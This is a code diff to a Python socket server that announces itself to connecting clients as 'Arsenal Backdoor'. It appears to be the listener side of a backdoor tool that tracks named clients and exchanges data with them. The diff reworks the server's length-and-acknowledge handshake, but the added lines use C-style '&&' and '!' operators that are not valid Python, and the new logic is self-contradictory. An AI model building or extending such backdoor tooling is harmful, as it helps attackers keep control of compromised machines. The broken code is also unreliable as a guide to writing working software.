@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import socket, sys, os, argparse, subprocess
+import socket, sys, os, argparse, subprocess, struct
 from _thread import start_new_thread
 parser = argparse.ArgumentParser(description='q*bert says goodbye')
 parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=int)
@@ -19,6 +19,7 @@ def get_file(filename):
 
 def client(conn, addr, buff):
     global clients
+    length = 0
     if addr[0] not in clients:
         conn.send(b'Arsenal Backdoor\n')
         data = conn.recv(buff)
@@ -26,11 +27,16 @@ def client(conn, addr, buff):
         clients[addr[0]] = str(data.strip(), 'utf-8')
     while True:
         holder = []
-        conn.send(b'sendbuf')
-        length = int(str(conn.recv(buff), 'utf-8'))
-        print(length)
-        conn.send(b'ack')
-        data = conn.recv(length)
+        ack = False
+        if length == 0:
+            conn.send(b'sendbuf')
+            length = int(str(conn.recv(buff), 'utf-8'))
+            print(length)
+        elif length > 0 && !ack:
+            conn.send(b'ack')
+        else:
+            ack = True
+            data = conn.recv(length)
         if data == b'NSTR':
             pass
         else:
@@ -47,7 +53,7 @@ def client(conn, addr, buff):
                 conn.send(bytes(reply, 'utf-8'))
                 print(reply)
                 break
-        print(data)
+        length = 0
         if not data:
             break
     conn.close()
